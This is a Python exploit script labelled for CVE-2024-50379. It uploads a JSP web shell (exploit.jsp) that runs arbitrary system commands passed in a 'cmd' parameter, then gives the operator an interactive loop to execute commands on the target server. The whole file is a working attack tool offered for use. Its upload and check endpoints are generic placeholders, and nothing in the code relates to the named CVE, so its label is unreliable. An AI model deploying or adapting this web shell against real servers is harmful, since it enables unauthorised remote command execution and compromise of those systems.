import requests
import time
import os,sys,re
from urllib.parse import urlparse

## 
## the OG c/o https://github.com/Alchemist3dot14/CVE-2024-50379
##

# Utility Functions

def get_base_url():
    """Prompt the user for the base URL and validate its format."""
    while True:
        base_url = input("\nEnter the base URL (e.g., http://localhost:8080): ").strip()

        # Ensure the URL has a valid scheme
        if not base_url.startswith("http://") and not base_url.startswith("https://"):
            base_url = "http://" + base_url

        parsed_url = urlparse(base_url)
        if parsed_url.scheme in ['http', 'https'] and parsed_url.netloc:
            return base_url
        else:
            print("[-] Invalid URL. Please include a valid scheme (http/https).")


def check_server(base_url):
    """Verify server accessibility and optional existence of the upload endpoint."""
    print("[+] Checking server accessibility...")
    try:
        # Test base URL
        response = requests.get(base_url, timeout=10)
        response.raise_for_status()

        # Test the upload endpoint
        upload_url = f"{base_url}/vulnerable/endpoint"
        upload_response = requests.get(upload_url, timeout=10)

        if upload_response.status_code == 200:
            print("[+] Vulnerable endpoint is accessible.")
        elif upload_response.status_code == 404:
            print("[-] Vulnerable endpoint not found, but continuing...")
        else:
            print(f"[-] Unexpected response: {upload_response.status_code}")

        return True
    except requests.exceptions.RequestException as e:
        print(f"[-] Server check failed: {e}")
        return False

# Exploit Functions

def upload_payload(base_url):
    """Upload the malicious payload to the server."""
    print("[+] Uploading payload...")
    upload_url = f"{base_url}/vulnerable/upload"
    payload_name = "exploit.jsp"
    payload_content = '''
    <%@ page import="java.io.*" %>
    <%
        if (request.getParameter("cmd") != null) {
            String cmd = request.getParameter("cmd");
            Process p = Runtime.getRuntime().exec(cmd);
            InputStream in = p.getInputStream();
            DataInputStream dis = new DataInputStream(in);
            String line;
            while ((line = dis.readLine()) != null) {
                out.println(line);
            }
        }
    %>
    '''

    files = {'file': (payload_name, payload_content, 'application/octet-stream')}
    retries = 3
    for attempt in range(retries):
        try:
            print(f"[+] Attempt {attempt + 1} to upload payload...")
            response = requests.post(upload_url, files=files, timeout=10)
            response.raise_for_status()

            if response.status_code == 200:
                print(f"[+] Payload uploaded successfully: {base_url}/uploads/{payload_name}")
                return True
            else:
                print(f"[-] Upload failed. Response: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"[-] Error during upload: {e}")
            time.sleep(2)  # Retry delay

    print("[-] Max retries reached. Upload failed.")
    return False


def execute_command(base_url, command):
    """Execute a system command via the uploaded payload."""
    payload_url = f"{base_url}/uploads/exploit.jsp"
    print(f"[+] Executing command: {command}")

    retries = 3
    for attempt in range(retries):
        try:
            params = {'cmd': command}
            response = requests.get(payload_url, params=params, timeout=10)
            response.raise_for_status()

            if response.status_code == 200:
                print("[+] Command output:")
                print(response.text.strip())
                return
            else:
                print(f"[-] Command execution failed: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"[-] Error during execution: {e}")
            time.sleep(2)

    print("[-] Command execution failed after retries.")

# Main Exploit Flow

def main():
    """Main execution logic."""
    print("\n[+] CVE-2024-50379 Exploit Script")

    base_url = get_base_url()

    if check_server(base_url):
        if upload_payload(base_url):
            while True:
                command = input("\nEnter command to execute (or 'exit' to quit): ").strip()
                if command.lower() == 'exit':
                    print("[+] Exiting.")
                    break
                elif command:
                    execute_command(base_url, command)
                else:
                    print("[-] Invalid command.")

if __name__ == "__main__":
    main()

##
##
